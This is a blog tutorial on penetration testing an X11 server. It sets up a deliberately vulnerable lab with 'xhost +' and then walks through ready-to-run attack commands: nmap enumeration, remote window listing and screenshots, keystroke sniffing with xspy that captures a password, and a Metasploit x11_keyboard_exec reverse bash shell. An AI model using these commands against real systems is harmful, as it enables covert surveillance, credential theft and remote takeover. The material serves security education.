<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Penetration Testing on X11 Server</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-x11-server/" rel="bookmark"><time class="entry-date published" datetime="2018-06-10T15:57:50+00:00">June 10, 2018</time><time class="updated" datetime="2025-06-04T16:27:29+00:00">June 4, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">X11 Server is an architecture-independent system for remote graphical user interfaces and input device capabilities. Each person using a networked terminal can interact with the display with any type of user input device.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">Source: <a style="color: #000000;" href="https://en.wikipedia.org/wiki/X_Window_System">Wikipedia</a></span></p>
<p class="ai-optimize-8"><span style="color: #000000;">In most cases, the X Server’s access control is disabled. But if enabled, it allows anyone to connect to the server. This Vulnerability is called <strong>X11 Server Unauthenticated Access Open</strong>. You can get more information from <span style="color: #800000;"><a style="color: #800000;" href="https://www.kb.cert.org/vuls/id/704969">here</a>.</span></span></p>
<p class="ai-optimize-9"><span style="color: #000000;">For a proper demonstration, we will have to set up an X11 Lab with this Vulnerability.</span></p>
<h3 class="ai-optimize-10"><span style="color: #800000;">Lab Setup</span></h3>
<p class="ai-optimize-11"><span style="color: #000000;">We will use an Ubuntu 14.04 system for this Vulnerable Lab setup. After the basic installation of the Ubuntu Server(LAMP), we will focus on locating the “lightdm.conf” file. </span></p>
<p class="ai-optimize-12"><span style="color: #000000;">The Location of this file is:<strong> /etc/lightdm/lightdm.conf</strong>. </span></p>
<p class="ai-optimize-13"><span style="color: #000000;">But if you can’t seem to find this at that location, you can get it for yourself from <a style="color: #000000;" href="https://raw.githubusercontent.com/CanonicalLtd/lightdm/master/data/lightdm.conf"><span style="color: #800000;">here</span></a>.</span></p>
<p class="ai-optimize-14"><span style="color: #000000;"><strong>NOTE</strong>: As all the files we are going to edit are accessible to the root user and the commands we are going to run are also for the root user. So to avoid the usage of sudo again and again, we are using a root terminal. To get the root terminal run “sudo bash” command in your terminal.</span></p>
<p class="ai-optimize-15"><span style="color: #000000;">Firstly, to edit the file, we will use gedit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gedit /etc/lightdm/lightdm.conf</pre>
<p class="ai-optimize-16"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-1fBmYVSDt_w/Wx1H9X-F4QI/AAAAAAAAXUg/biipR4ZI6VsCEaldE2zmwwM7T8BAUCvAgCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-17"><span style="color: #000000;">Then, to create vulnerability, we will uncomment the following line in lightdm.conf as shown below :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xserver-allow-tcp=true</pre>
<p class="ai-optimize-18"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-muTlSKCorJI/Wx1IACK6WfI/AAAAAAAAXVI/B4FMLz1016IRjPdHXazMV4DsG_V9Dzn1wCLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-19"><span style="color: #000000;">Now that we have saved the changes made in the conf file, to make them come into effect, we will restart the lightdm service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">service lightdm restart</pre>
<p class="ai-optimize-20"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VCktbL0Edd8/Wx1IAGqMBJI/AAAAAAAAXVE/ZTu-_rLHUUISkkonWZxfoOexzX-HjIMwgCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-21"><span style="color: #000000;">Now, when the lightdm service restarts, we will disable the access control with the following command. This will allow clients on the network to get connected to the server. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xhost +</pre>
<p class="ai-optimize-22"><span style="color: #000000;">And that’s it. We have successfully created the X11 Vulnerable Server.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R9KHBGsZ824/Wx1IARF1oBI/AAAAAAAAXVM/JpzMWXsPayQc1VnFEqpvgqclboaAxiY2gCLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;">Penetration Testing of X11 Server</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">Firstly, to begin Penetration Testing, we will start with the enumeration of the Vulnerable Server. To do a port enumeration we will use the nmap tool.<br/>
</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 192.168.1.109</pre>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-njgBfkwIxTI/Wx1IBITQgAI/AAAAAAAAXVQ/_oeFIyOcR6M8TXkC3Ff31NbhPvmtFo6ewCLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">As we can see from the image that we have the TCP port 6000 open on the Server (192.168.1.109). Also, it is running the X11 service on that port.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">Nmap has a script that checks if the attacker is allowed to connect to the X Server. We can check if the X Server allows us the connection as shown below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap 192.168.1.109 -p 6000 --script x11-access</pre>
<p class="ai-optimize-29"><span style="color: #000000;">We can see from the image provided that the X Server allows us access.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-SPpTT8JJpBs/Wx1IBrhpdBI/AAAAAAAAXVU/7SKdSEUYjboP5UCdnzKoZyl0F5F5HJXmwCLcBGAs/s1600/6.png"/></strong></span></p>
<h3 class="ai-optimize-31"><span style="color: #800000;">XWININFO</span></h3>
<p class="ai-optimize-32"><span style="color: #000000;">This is the built-in utility in Kali, which shows the window’s information for the X Service. Xwininfo can be used to get information about the windows opened on the target system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xwininfo -root -tree -display 192.168.1.109:0</pre>
<ul>
<li class="ai-optimize-33"><span style="color: #000000;">Root = specifies that X’s root window is the target window</span></li>
<li class="ai-optimize-34"><span style="color: #000000;">Tree = displays the names of the windows</span></li>
<li class="ai-optimize-35"><span style="color: #000000;">Display = specify the server to connect to</span></li>
</ul>
<p class="ai-optimize-36"><span style="color: #000000;">We can extract much information from the screenshot, like:</span></p>
<ul>
<li class="ai-optimize-37"><span style="color: #000000;">The victim has Gnome Terminal open</span></li>
<li class="ai-optimize-38"><span style="color: #000000;">The victim is a VMware user</span></li>
<li class="ai-optimize-39"><span style="color: #000000;">The victim has Nautilus (Ubuntu File Browser) open</span></li>
</ul>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-r699bHo91gw/Wx1ICGkASOI/AAAAAAAAXVY/FIxljA_AhKYO5sGLKGEfRdqC-CDiP5UvACLcBGAs/s1600/7.png"/></span></p>
<h3 class="ai-optimize-41"><span style="color: #800000;">XWD</span></h3>
<p class="ai-optimize-42"><span style="color: #000000;">It is an X Window System utility that helps in taking screenshots. On our Kali System, we will use the xwd to take a screenshot of Xserver. This utility takes the screenshots in xwd format.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xwd -root -screen -silent -display 192.168.1.109:0 &gt; screenshot.xwd</pre>
<p class="ai-optimize-43"><span style="color: #000000;">Root = indicates that the root window should be selected for the window dump</span></p>
<p class="ai-optimize-44"><span style="color: #000000;">Screen = indicates that the GetImage request was used to obtain the image</span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Silent = Operate silently, i.e., don’t ring any bells before and after dumping the window.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Display = specify the server to connect to</span></p>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-drN0bwIQOj8/Wx1ICT_N8MI/AAAAAAAAXVc/CuTdTol1rs03gxziPOGzZludS5Yb3um7gCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">After running the aforementioned command, we will successfully capture a screenshot from the victim system.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wXe0ELVLYco/Wx1ICVxnAsI/AAAAAAAAXVg/aUIKqb99NvgWKO4auSf6_LnY_xsk7HtDQCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">Here we have the screenshot captured by the xwd, but it is in .xwd format, so to view it, we will have to convert it to a viewable format like .png</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">convert screenshot.xwd screenshot.png</pre>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-503W3yeUVF8/Wx1H9WwjYmI/AAAAAAAAXUc/9dNO6kgiHWc6h_gD52HZLf2orTnEPdaiACLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Consequently, this command will convert the xwd to a PNG file. Afterward, we can find our screenshot in the PNG file format as shown below:</span></p>
<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_e3ijd9AekY/Wx1H9Ru8IaI/AAAAAAAAXUk/-fnldR7joX0xwqQps2QMegpkRtIj5iaRACLcBGAs/s1600/11.png"/>                              </span></p>
<p class="ai-optimize-54"><span style="color: #000000;">On opening the png file, we can see that the xwd tool has successfully captured the screenshot of the target system.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qPBWA22DwsQ/Wx1H-pUZHWI/AAAAAAAAXUw/lQCIMSngGLwtLdABDm5KlqL2mD3nHOhZgCLcBGAs/s1600/12.png"/></span></p>
<h3 class="ai-optimize-56"><span style="color: #800000;">XSPY</span></h3>
<p class="ai-optimize-57"><span style="color: #000000;">It is a built-in tool in Kali Linux for the X Window Servers. XSPY is a sniffer, it sniffs keystrokes on the remote or local X Server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">xspy 192.168.1.109</pre>
<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-czuhy1tXxNE/Wx1H-RTWUzI/AAAAAAAAXUo/29J_WVUApvIkCJrJVr_D5Eycz0ziGrkDgCLcBGAs/s1600/13.png"/></span></p>
<p class="ai-optimize-59"><span style="color: #000000;">As we can see from the given screenshot that we got the user password as the victim has unknowingly entered the password. Also, see that the password is not visible on the Server terminal, but as the xspy captures the keys typed, hence we have the password typed.</span></p>
<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0WVMqKWgI2k/Wx1H-Ut_16I/AAAAAAAAXUs/uJ4LD2_EcjQZZzSUEdrBL2JCJqCAFzy4ACLcBGAs/s1600/14.png"/></span></p>
<h3 class="ai-optimize-61"><span style="color: #800000;">Getting the Shell through Metasploit</span></h3>
<p class="ai-optimize-62"><span style="color: #000000;">Now we will use the X11 Keyboard Command Injection module of the Metasploit Framework. This module exploits open X11 Server by connecting and registering a virtual keyboard. Then the Virtual Keyboard is used to open an xterm or gnome-terminal and then type and execute the payload.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><strong>NOTE</strong>: As X Server is a visual service, while the executing of the module will take place, every task occurring on the Target System will be visible to the Victim.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Then, after opening the Metasploit Framework, we will use the payload as shown:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use unix/x11/x11_keyboard_exec
msf exploit(unix/x11x11_keyboard_exec) &gt; set rhost 192.168.1.109
msf exploit(unix/x11x11_keyboard_exec) &gt; set payload cmd/unix/reverse_bash
msf exploit(unix/x11x11_keyboard_exec) &gt; set lhost 192.168.1.120
msf exploit(unix/x11x11_keyboard_exec) &gt; set lport 4444
msf exploit(unix/x11x11_keyboard_exec) &gt; set time_wait 10
msf exploit(unix/x11x11_keyboard_exec) &gt;  run</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C6RITIw7mCs/Wx1H-0Ct0uI/AAAAAAAAXU0/AxAChutryLQ-VBEUJ2tlZRLp6IVdEVtigCLcBGAs/s1600/15.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">After running the module, it will first connect to the Server and search for xterm and open it.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tBCuA9HWcoA/Wx1H_cuPHuI/AAAAAAAAXU8/kQOekKqRrpwgMyLsBWkAfNw_y7jQvCGRQCLcBGAs/s1600/16.PNG"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Then, after waiting for 10 seconds as its the wait time we gave earlier, it will start typing the script command on the xterm.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mcQfKv7TV6M/Wx1H_U0psZI/AAAAAAAAXU4/NY2-ZuTmIN8f9S_vihYTotmpV5DQUHqAACLcBGAs/s1600/17.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Finally, after executing this command, xterm will get closed, but it will provide a <strong>command shell</strong> to the Attacker as shown.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rd6qSA0k3zA/Wx1H_aE0WfI/AAAAAAAAXVA/liTp8GMGyggkar-vdAx8aIV86l4Ms6BhwCLcBGAs/s1600/18.png"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
